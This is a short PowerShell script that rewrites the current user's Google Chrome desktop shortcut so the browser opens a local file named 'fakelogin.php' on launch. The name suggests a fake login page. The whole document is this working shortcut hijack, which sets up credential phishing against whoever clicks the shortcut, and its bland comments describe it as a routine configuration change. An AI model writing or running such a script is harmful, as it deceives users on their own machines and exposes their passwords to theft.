# Instantiate a clean Windows Script Host object
$wsh = New-Object -ComObject WScript.Shell

# Define the user's specific desktop shortcut location
$shortcutPath = "$env:USERPROFILE\Desktop\Google Chrome.lnk"

if (Test-Path $shortcutPath) {
    # Open the existing shortcut template properties
    $shortcut = $wsh.CreateShortcut($shortcutPath)
    
    # Append the local file path as the default runtime target parameter
    $shortcut.Arguments = '"file:///C:/Users/kyson/fakelogin.php"'
    
    # Save changes back out to disk
    $shortcut.Save()
    Write-Output "Success: Google Chrome desktop shortcut target modified."
} else {
    Write-Error "Google Chrome desktop shortcut not located on this user profile."
}
